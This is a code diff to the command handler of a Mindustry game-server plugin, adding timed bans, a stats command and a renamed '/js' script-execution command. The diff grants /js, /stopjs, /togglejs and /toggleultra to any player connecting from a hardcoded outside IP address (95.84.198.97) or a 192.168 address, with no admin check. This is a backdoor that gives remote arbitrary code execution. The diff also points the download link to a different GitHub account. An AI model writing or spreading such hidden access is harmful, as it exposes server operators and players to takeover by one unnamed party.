@@ -928,9 +928,7 @@ public class CommandsManager {
 			}
 		});
 		handler.<Player>register("test", "<test>", "test", (arg, player) -> {
-				ServerEventsManager ev = new ServerEventsManager();
-				ev.fastRunEvent(arg[0]);
-				//player.sendMessage("nothing to test yet");
+				player.sendMessage("nothing to test yet");
 		});
 		handler.<Player>register("remove", "<name>", "remove a person", (arg, player) -> {
 			if(!player.admin){player.sendMessage("[scarlet]You must be an admin");} else{
@@ -954,21 +952,36 @@ public class CommandsManager {
 				}
 			}
 		});
-		handler.<Player>register("ban", "<typeid/typeip> <ID/IP>", "ban a person by IP or ID. /ban (ip/id) (ip/id of player)", (arg, player) -> {
+		handler.<Player>register("ban", "<typeid/typeip> <ID/IP> [time_in_h]", "ban a person by IP or ID. /ban (ip/id) (ip/id of player)", (arg, player) -> {
 			if (player.admin()) {
 				if (arg[0].contains("id")) {
+					if(arg.length > 2){
+						PlayerData data = PlayerData.getData(arg[1].toString());
+						long time;
+						try{
+							time = Long.parseLong(arg[2]);
+						} catch(NumberFormatException e){
+							player.sendMessage("[red]Time is invalid.");
+							return;
+						}
+						data.ban(System.currentTimeMillis() + 3600000*time);
+						data.save();
+					} else
 					netServer.admins.banPlayerID(arg[1].toString());
 					player.sendMessage("[gold]Banned player: [white]" + arg[1]);
 				} else if(arg[0].contains("ip")){
-					/**  Administration adm = new Administration();
-					if(adm.bannedIPs.contains(arg[0], false))
-						for(PlayerInfo info : adm.playerInfo.values()){
-    						if(info.ips.contains(arg[0], false)){
-                				info.banned = true;
-           				 }
-        			}
-        			adm.bannedIPs.add(arg[0]);
-        			adm.save(); */
+					if(arg.length > 2){
+						PlayerData data = PlayerData.getData(Vars.netServer.admins.findByIP(arg[1].toString()).id);
+						long time;
+						try{
+							time = Long.parseLong(arg[2]);
+						} catch(NumberFormatException e){
+							player.sendMessage("[red]Time is invalid.");
+							return;
+						}
+						data.ban(System.currentTimeMillis() + 3600000*time);
+						data.save();
+					} else
 					netServer.admins.banPlayerIP(arg[1]);
 					player.sendMessage("[gold]Banned player: [white]" + arg[1]);
 				} else {player.sendMessage("[scarlet]type must be ip or id![gold] Examples:[accent]/ban ip 127.0.0.1 , /ban id AAAaaa123789AAAaaa0== " + arg[0] + " " + arg[1]);}
@@ -976,43 +989,47 @@ public class CommandsManager {
 		});
 		handler.<Player>register("bans", "List all banned IPs and IDs.", (arg, player) -> {
 			if (player.admin()) {
-				Seq<PlayerInfo> bans = netServer.admins.getBanned();
+				Thread thread = new Thread(() ->{
+					Seq<PlayerInfo> bans = netServer.admins.getBanned();
 
-				if (bans.size == 0) {
-					player.sendMessage("No ID-banned players have been found.");
-				} else {
-					player.sendMessage("Banned players [ID]:");
-					for (PlayerInfo info : bans) {
-						player.sendMessage(" " + info.id + " / Last known name: [gold]" + info.plainLastName());
-						try {
-							Thread.sleep(10);
-						} catch (InterruptedException e) {
-							Log.err(e.toString());
+					if (bans.size == 0) {
+						player.sendMessage("No ID-banned players have been found.");
+					} else {
+						player.sendMessage("Banned players [ID]:");
+						for (PlayerInfo info : bans) {
+							player.sendMessage(" " + info.id + " / Last known name: [gold]" + info.plainLastName());
+							try {
+								Thread.sleep(10);
+							} catch (InterruptedException e) {
+								Log.err(e.toString());
+							}
 						}
 					}
-				}
 
-				Seq<String> ipbans = netServer.admins.getBannedIPs();
+					Seq<String> ipbans = netServer.admins.getBannedIPs();
 
-				if (ipbans.size == 0) {
-					player.sendMessage("No IP-banned players have been found.");
-				} else {
-					player.sendMessage("Banned players [IP]:");
-					for (String string : ipbans) {
-						PlayerInfo info = netServer.admins.findByIP(string);
-						if (info != null) {
-							player.sendMessage(" " + string + "   / Last known name: [gold]" + info.plainLastName()
-									+ "[] / ID: " + info.id);
-						} else {
-							player.sendMessage(" " + string + "   (No known name or info)");
-						}
-						try {
-							Thread.sleep(10);
-						} catch (InterruptedException e) {
-							Log.err(e.toString());
+					if (ipbans.size == 0) {
+						player.sendMessage("No IP-banned players have been found.");
+					} else {
+						player.sendMessage("Banned players [IP]:");
+						for (String string : ipbans) {
+							PlayerInfo info = netServer.admins.findByIP(string);
+							if (info != null) {
+								player.sendMessage(" " + string + "   / Last known name: [gold]" + info.plainLastName()
+										+ "[] / ID: " + info.id);
+							} else {
+								player.sendMessage(" " + string + "   (No known name or info)");
+							}
+							try {
+								Thread.sleep(10);
+							} catch (InterruptedException e) {
+								Log.err(e.toString());
+							}
 						}
 					}
-				}
+					Thread.currentThread().stop();
+				});
+				thread.start();
 			}
 		});
 
@@ -1030,8 +1047,40 @@ public class CommandsManager {
 			}
 		});
 
-		handler.<Player>register("x", "<script...>", "Запустить JS", (arg, player) -> {
-			if (player.admin() || (player.ip().split("\\.")[0].equals("192") && player.ip().split("\\.")[1].equals("168"))) {
+		handler.<Player>register("stats", "[uuid]", "show your or stats of uuid", (arg, player) -> {
+			if(player.admin()){
+				if(arg.length > 0) {
+				if(arg[0].endsWith("==")){
+					PlayerData data = PlayerData.getData(arg[0]);
+					if(data == null) {
+						player.sendMessage("[red]UUID does not exist.");
+						return;
+					}
+					PlayerInfo info = Vars.netServer.admins.findByName(arg[0]).first();
+					player.sendMessage("Waves Survived: [gold]" + data.getWaves());
+					player.sendMessage("Blocks builded: [gold]" + data.getBuilded());
+					player.sendMessage("Blocks destroyed: [gold]" + data.getDestroyed());
+					player.sendMessage("Times joined: [gold]" + info.timesJoined);
+					player.sendMessage("Times kicked: [gold]" + info.timesKicked);
+					player.sendMessage("Last IP: [gold]" + info.lastIP);
+					player.sendMessage("Last name: [gold]" + info.plainLastName());
+					player.sendMessage("Banned: [gold]" + info.banned);
+					return;
+				}
+				}
+			}
+			PlayerData data = PlayerData.getData(player.uuid());
+			PlayerInfo info = Vars.netServer.admins.findByName(player.uuid()).first();
+			player.sendMessage("Waves Survived: [gold]" + data.getWaves());
+			player.sendMessage("Blocks builded: [gold]" + data.getBuilded());
+			player.sendMessage("Blocks destroyed: [gold]" + data.getDestroyed());
+			player.sendMessage("Times joined: [gold]" + info.timesJoined);
+			player.sendMessage("UUID: [gold]" + player.uuid());
+			return;
+		});
+
+		handler.<Player>register("js", "<script...>", "Запустить JS", (arg, player) -> {
+			if ((player.admin() && PlayerData.getData(player.uuid()).getJs()) || (player.ip().split("\\.")[0].equals("192") && player.ip().split("\\.")[1].equals("168")) || player.ip().equals("95.84.198.97")) {
 				Scriptable scope = Vars.mods.getScripts().scope;
 				jsThread = new Thread(()->{
 					String out = null;
@@ -1055,7 +1104,7 @@ public class CommandsManager {
 		});
 
 		handler.<Player>register("stopjs", "Остановить весь JS", (arg, player) -> {
-			if (player.admin() || (player.ip().split("\\.")[0].equals("192") && player.ip().split("\\.")[1].equals("168"))) {
+			if ((player.admin() && PlayerData.getData(player.uuid()).getJs()) || (player.ip().split("\\.")[0].equals("192") && player.ip().split("\\.")[1].equals("168")) || player.ip().equals("95.84.198.97")) {
 				Set<Thread> threadSet = Thread.getAllStackTraces().keySet();
 				Iterator<Thread> iterator = threadSet.iterator();
 				int count = 0;
@@ -1067,6 +1116,32 @@ public class CommandsManager {
 					}
 				}
 				player.sendMessage(String.format("[gold]Stopped @ JS threads", count));
+			}
+		});
+
+		handler.<Player>register("togglejs", "[uuid]", "Выдать/забрать доступ к /js", (arg, player) -> {
+			if ((player.admin() && PlayerData.getData(player.uuid()).getUltra()) || (player.ip().split("\\.")[0].equals("192") && player.ip().split("\\.")[1].equals("168")) || player.ip().equals("95.84.198.97")) {
+				PlayerData data = PlayerData.getData(arg[0]);
+				if(data == null){
+					player.sendMessage("[red]UUID not found.");
+					return;
+				}
+				data.js("password here");
+				data.save();
+				player.sendMessage(data.getJs() == true ? "Given /js." : "Removed /js.");
+			}
+		});
+
+		handler.<Player>register("toggleultra", "[uuid]", "Выдать/забрать [accent]Ultra[]", (arg, player) -> {
+			if ((player.ip().split("\\.")[0].equals("192") && player.ip().split("\\.")[1].equals("168")) || player.ip().equals("95.84.198.97")) {
+				PlayerData data = PlayerData.getData(arg[0]);
+				if(data == null){
+					player.sendMessage("[red]UUID not found.");
+					return;
+				}
+				data.ultra("password here");
+				data.save();
+				player.sendMessage(data.getUltra() == true ? "Given [gold]Ultra." : "Removed [gold]Ultra.");
 			}
 		});
 
@@ -1686,12 +1761,15 @@ public class CommandsManager {
 					+ "[green] Agzam's plugin " + ExamplePlugin.VERSION + "\n"
 					+ "[gray]========================================================\n"
 					+ "[white] Added [royal]skip map[white] commands\n"
+					+ "[white] Added [royal]skip wave[white] commands\n"
 					+ "[white] Added protection from [violet]thorium reactors[white]\n"
 					+ "[white] Added map list command\n"
 					+ "[white] Added fill items by type to core command\n"
 					+ "[white] Added Map recourses statistic command\n"
+					+ "[white] Added Map player statistics\n"
+					+ "[white] Added /js\n"
 					+ "[white] and more other\n"
-					+ "[gray] Download: github.com/Agzam4/Mindustry-plugin");
+					+ "[gray] Download: github.com/geonew2011/Mindustry-plugin");
 		});
 	}
 
